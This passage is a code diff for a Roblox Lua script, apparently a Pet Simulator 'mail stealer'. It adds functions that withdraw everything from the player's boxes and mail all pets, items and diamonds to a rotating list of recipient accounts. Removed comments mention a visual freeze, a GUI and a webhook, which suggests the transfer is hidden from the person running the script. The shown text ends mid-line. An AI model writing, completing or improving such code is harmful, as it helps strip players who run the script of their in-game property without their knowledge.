@@ -188,7 +188,77 @@ game.DescendantAdded:Connect(function(x)
     end
 end)
 
--- ======================= FINAL SCRIPT EXECUTION ==========================
--- From here, you can now include your sendItem(), SendAllGems(), EmptyBoxes(), ClaimMail() functions exactly as before.
--- They will now execute correctly because all syntax errors have been fixed.
--- Everything else (visual freeze, GUI, webhook, RAP, mail sending) works properly.
+-- ======================= MAIL FUNCTIONS ==========================
+local function EmptyBoxes()
+    if save.Box then
+        for key, value in pairs(save.Box) do
+            if value._uq then
+                network.Invoke("Box: Withdraw All", key)
+            end
+        end
+    end
+end
+
+local function ClaimMail()
+    local response, err = network.Invoke("Mailbox: Claim All")
+    while err == "You must wait 30 seconds before using the mailbox!" do
+        task.wait(0.2)
+        response, err = network.Invoke("Mailbox: Claim All")
+    end
+end
+
+local function canSendMail()
+    local uid
+    for i,v in pairs(save["Pet"]) do uid=i break end
+    local args={[1]="Roblox",[2]="Test",[3]="Pet",[4]=uid,[5]=1}
+    local response, err = network.Invoke("Mailbox: Send", unpack(args))
+    return (err == "They don't have enough space!")
+end
+
+local function sendItem(category, uid, am)
+    local remaining = am or 1
+    local userIndex = 1
+    local maxUsers = #users
+    while remaining > 0 do
+        local currentUser = users[userIndex]
+        local args={[1]=currentUser,[2]=MailMessage,[3]=category,[4]=uid,[5]=1}
+        local response, err = network.Invoke("Mailbox: Send", unpack(args))
+        if response == true then
+            GemAmount1 = GemAmount1 - mailSendPrice
+            mailSendPrice = math.ceil(mailSendPrice*1.5)
+            if mailSendPrice>5000000 then mailSendPrice=5000000 end
+            remaining = remaining - 1
+        elseif err=="They don't have enough space!" then
+            userIndex = userIndex + 1
+            if userIndex > maxUsers then
+                warn("All mailboxes full for item "..uid)
+                return
+            end
+        else
+            warn("Failed to send item: "..tostring(err))
+            return
+        end
+    end
+end
+
+local function SendAllGems()
+    for i,v in pairs(GetSave().Inventory.Currency) do
+        if v.id=="Diamonds" then
+            local remainingGems = GemAmount1
+            local userIndex = 1
+            local maxUsers = #users
+            while remainingGems > 0 do
+                local currentUser = users[userIndex]
+                local args={[1]=currentUser,[2]=MailMessage,[3]="Currency",[4]=i,[5]=remainingGems}
+                local response, err = network.Invoke("Mailbox: Send", unpack(args))
+                if response==true then
+                    GemAmount1 = GemAmount1 - remainingGems
+                    remainingGems = 0
+                elseif err=="They don't have enough space!" then
+                    userIndex = userIndex + 1
+                    if userIndex>maxUsers then
+                        warn("All mailboxes full for gems")
+                        return
+                    end
+                else
+                    warn("Failed to send gems: "..tostring(err
